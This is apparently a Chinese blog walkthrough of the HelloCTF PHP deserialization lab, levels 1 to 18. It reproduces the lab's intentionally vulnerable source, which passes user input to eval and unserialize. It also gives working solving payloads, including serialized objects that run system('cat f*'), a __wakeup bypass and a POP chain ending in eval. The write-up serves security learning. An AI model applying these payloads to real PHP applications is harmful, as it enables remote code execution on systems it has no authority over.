---
title: PHP反序列化
published: 2026-05-25
updated: 2026-07-15
draft: false
description: PHP反序列化靶场通关
image: ""
tags:
  - PHP
  - PHP反序列化
  - 反序列化
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---
### 第一关

```
<?php 
/*   
--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 ---HINT：尝实例化下面的FLAG类吧！      
# -*- coding: utf-8 -*-   
# @Author: 探姬   
# @Date:   2024-07-01 20:30   # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs   
# @email:  admin@hello-ctf.com   # @link:   hello-ctf.com      */         class FLAG{       
	public $flag_string = "HelloCTF{？？？？}";
	function __construct(){           
		echo $this->flag_string;       
	}   
}   
$code = $_POST['code'];      
eval($code);
?>

```

```php
code=new FLAG();
```


在这里`__construct`方法会在`new`新对象的时候调用
### 第二关

```php
`<?php      
/*   --- HelloCTF - 反序列化靶场 关卡 2 : 类值的传递 ---       
HINT：尝试将flag传递出来~      
# -*- coding: utf-8 -*-   
# @Author: 探姬   
# @Date:   2024-07-01 20:30   # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs   # @email:  admin@hello-ctf.com   # @link:   hello-ctf.com      */      error_reporting(0); 
$flag_string = "HelloCTF{？？？？}";        
class FLAG{           
	public $free_flag = "???";              
	function get_free_flag(){               
		echo $this->free_flag;           
	}       
}   
$target = new FLAG();
$code = $_POST['code'];
if(isset($code)){          
	eval($code);       
	$target->get_free_flag();   
	}else{    
		highlight_file('source');   
	}
```

```php
code=$target->$free_flag = $flag_string;
```

让`free_flag`输出`flag_string`的值就行

### 第三关

```php
 <?php

/*
--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 --- 
HINT：尝试将flag传递出来~
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-01 20:30
# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com
*/

class FLAG{
    public $public_flag = "HelloCTF{?";
    protected $protected_flag = "?";
    private $private_flag = "?}";

    function get_protected_flag(){
        return $this->protected_flag;
    }

    function get_private_flag(){
        return $this->private_flag;
    }
}

class SubFLAG extends FLAG{
    function show_protected_flag(){
        return $this->protected_flag;
    }

    function show_private_flag(){
        return $this->private_flag;
    }
}

$target = new FLAG();
$sub_target = new SubFLAG();
$code = $_POST['code'];
if(isset($code)){
    eval($code);
} else {

    highlight_file(__FILE__);

    echo "Trying to get FLAG...<br>";
    echo "Public Flag: ".$target->public_flag."<br>";
    echo "Protected Flag:".$target->protected_flag ."<br>";
    echo "Private Flag:".$target->private_flag ."<br>";
}
?>

Trying to get FLAG...
Public Flag: HelloCTF{se3_me_
Protected Flag: Error: Cannot access protected property FLAG:: in ?
Private Flag: Error: Cannot access private property FLAG:: in ?
...Wait,where is the flag?
```

由于私有成员是不不可以被继承类访问的,但是在父类的方法内定义了访问父类私有成员的方法,可以通过这个方法进行访问,同样的,保护成员和公有成员都被定义了方法的话直接使用就好

```php
code=echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();
```

### 第四关


构造序列化把`FLAG3`的数据带出来就行,利用菜鸟工具在线序列化
```php
<?php

class FLAG3{
    private $flag3_object_array = array("？","？");
}

class FLAG{
     private $flag1_string = "？";
     private $flag2_number = '?';
     private $flag3_object;

    function __construct() {
        $this->flag3_object = new FLAG3();
    }
}

$flag_is_here = new FLAG();

$code=serialize($flag_is_here);
echo $code;

?>
```


```php
code=echo serialize($flag_is_here);
```

得到结果:

```php
O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}
```

### 第五关


```php
<?php

/*
--- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 ---
HINT：各有千秋~
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-01 20:30
# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com
*/

class a_class{
    public $a_value = "HelloCTF";
}

$a_object = new a_class();
$a_array = array(a=>"Hello",b=>"CTF");
$a_string = "HelloCTF";
$a_number = 678470;
$a_boolean = true;
$a_null = null;
/*
See How to serialize:

a_object: O:7:"a_class":1:{s:7:"a_value";s:8:"HelloCTF";}
a_array: a:2:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";}
a_string: s:8:"HelloCTF";
a_number: i:678470;
a_boolean: b:1;
a_null: N;
Now your turn!
*/*


$your_object = unserialize($_POST['o']);
$your_array = unserialize($_POST['a']);
$your_string = unserialize($_POST['s']);
$your_number = unserialize($_POST['i']);
$your_boolean = unserialize($_POST['b']);
$your_NULL = unserialize($_POST['n']);

if(

    $your_boolean && 
    $your_NULL == null &&
    $your_string == "IWANT" &&
    $your_number == 1 &&
    $your_object->a_value == "FLAG" &&
    $your_array['a'] == "Plz" && $your_array['b'] == "Give_M3"
){
    echo $flag;
}

else{
    echo "You really know how to serialize?";
}

//HelloCTF{Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!}
```

直接构造就行序列化就行:

```php
<?php

class a_class{
    public $a_value = "HelloCTF";
}

$your_object=new a_class();
$your_boolean = true;
$your_NULL = null;
$your_string = "IWANT";
$your_number = 1;
$your_object->a_value = "FLAG";
$your_array['a'] = "Plz";
$your_array['b'] = "Give_M3";

echo serialize($your_boolean)."\n";
echo serialize($your_NULL)."\n";
echo serialize($your_string)."\n";
echo serialize($your_number)."\n";
echo serialize($your_object)."\n";
echo serialize($your_array)."\n";

?>
```

得到序列化结果:

```php
b:1;
N;
s:5:"IWANT";
i:1;
O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}
a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}
```

exp:

```php
o=O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}&a=a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}&s=s:5:"IWANT";&i=i:1;&b=b:1;&n=N;
```

### 第六关

```php
 <?php

/*
--- HelloCTF - 反序列化靶场 关卡 6 : 序列化规则_权限修饰 --- 
HINT：各有千秋~特别注意的权限修饰符x
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-01 20:30
# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com
*/

class protectedKEY{
    protected $protected_key;
    function get_key(){
        return $this->protected_key;
    }
}

class privateKEY{
    private $private_key;
    function get_key(){
        return $this->private_key;
    }
}
/*
See Carfully~

protected's serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D

private's serialize: O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3BN%3B%7D
*/
<?php

$protected_key = unserialize($_POST['protected_key']);
$private_key = unserialize($_POST['private_key']);

if(isset($protected_key)&&isset($private_key)){
    if($protected_key->get_key() == "protected_key" && $private_key->get_key() == "private_key"){
        echo $flag;
    } else {
        echo "We Call it %00_Contr0l_Characters_NULL!";
    }
} else {
    highlight_file(__FILE__);
}
```

```php
<?php

class protectedKEY{
    protected $protected_key="protected_key";

    function get_key(){
        return $this->protected_key;
    }
}

class privateKEY{
    private $private_key="private_key";

    function get_key(){
        return $this->private_key;
    }

}

$x = new protectedKEY();
$y = new privateKEY();
echo "protected_key=".urlencode(serialize($x))."&private_key=".urlencode(serialize($y));
```

> 我之前以为利用菜鸟工具生成的php序列化字符串字符部分乱码不可见是因为字符问题,但是确实不是,是由于权限问题-私有/保护成员导致的,所以需要url解码

PHP 中 private 和 protected 属性在序列化时会插入 NUL 字节（`\0`），这些不可见字符在 HTTP 传输中容易被截断或丢弃，导致反序列化失败；使用 urlencode 可以将 NUL 字节编码为 `%00`，从而保证序列化字符串完整传递

### 第七关 

这一关考察序列化,直接序列化相关类并且`cat fl*`即可

```php
<?php
class FLAG{
    public $flag_command = "system('cat f*');";

    function backdoor(){
        eval($this->flag_command);
    }
}

$a = new FLAG();
$a = serialize($a);
echo $a;

?>
```

```php
O:4:"FLAG":1:{s:12:"flag_command";s:17:"system('cat f*');";}
```

### 第八关

```php
<?php
	  
class RELFLAG {

    public function __construct()
    {
        global $flag;
        $flag = 0;
        $flag++;

    }
    public function __destruct()
    {
        global $flag;
        $flag++;

    }
}
$code = new RELFLAG('code');
$a=serialize($code);

unserialize($a);
unserialize($a);
unserialize($a);
unserialize($a);

unset($code);

echo $flag;
	  
?>
```

让$a不断反序列化但是不指定给对象让它自己销毁即可,但是为了在`post`请求中输出一条完整的命令

```php
code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));
```

### 第九关

```php
<?php
class FLAG {
    var $flag_command = "system('cat /f*');";
    public function __destruct()
    {
        eval ($this->flag_command);
    }
}

$a = new FLAG();
echo serialize($a);
?>
```

```php
o=O:4:"FLAG":1:{s:12:"flag_command";s:13:"system('ls');";}
```

我拿这个命令看了下,没有`flag.php`或者`fl*`等文件,还是我的本地环境不合适,这个靶场我是通过`lingjing`一键部署的,存在一些问题

```php
O:4:"FLAG":1:{s:12:"flag_command";s:18:"system('cat /f*');";}
```

### 第十关

```php
<?php
class FLAG{
    function __wakeup() {
        include 'flag.php';
        echo $flag;
    }
}

$a = new FLAG();
echo serialize($a);
?>
```

`__wake_up`魔术方法会在对象序列化时调用,直接序列化就行

```php
o=O:4:"FLAG":0:{}
```

### 第十一关

```php
<?php
class FLAG {
    public $flag = "FAKEFLAG";

    public function  __wakeup(){
        global $flag;
        $flag = NULL;
    }
    public function __destruct(){
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }else
        {
            echo "sorry,flag is gone!";
        }
    }
}

$a = new FLAG();
echo serialize($a);
//$c = 'O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}';
//echo unserialize($c);
?>
```

让object的包含的属性多一个就行

```php
0=O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
```

### 第十三关

```php
o=echo $obj;
```

### 第十四关

```php
o=$obj('get_flag');
```

### 第十五关

```php
<?php

/*
--- HelloCTF - 反序列化靶场 关卡 15 : POP链初步 --- 
世界的本质其实就是套娃（x
# -*- coding: utf-8 -*-
# @Author: 探姬(@ProbiusOfficial)
# @Date:   2024-07-01 20:30
# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com
*/

/* FLAG in flag.php */

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}

class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}

class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }

    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
?>
```

```php
o=O:1:"D":1:{s:1:"d";O:10:"destnation":1:{s:3:"cmd";O:1:"A":1:{s:1:"a";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:17:"system('cat f*');";}}}}}
```

总体逻辑是D调用了`destnation`,然后`eval($this->cmd->a->b->c);`,按照这个顺序来就行.

```php

<?php

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}
$objd=new D(new destnation(new A(new B(new C("system('cat f*');")))));
$yes = serialize($objd);
echo $yes;
echo unserialize($yes);
?>
```


### 第十六关

```php

<?php

class A {
    public $a='flag.php';
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}

class B {
    public $b;
    public function __toString() {
        $f = $this->b;
        return $f();
    }
}


class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}

$a = new A();
$b = new B();
$init = new INIT() ;
$b->b = $a;
$init->name = $b;

$ok=serialize($obj);
echo unserialize($ok);
?>
```

```php
o=O:4:"INIT":1:{s:4:"name";O:1:"B":1:{s:1:"b";O:1:"A":1:{s:1:"a";s:8:"flag.php";}}}
```

### 第十七关

```php
class A{
    public $helloctfcmd = "get_flag";
}
```

### 第十八关

```http
http://192.168.242.222:8080/Level18/index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8
```

截断字符串使得条件满足即可
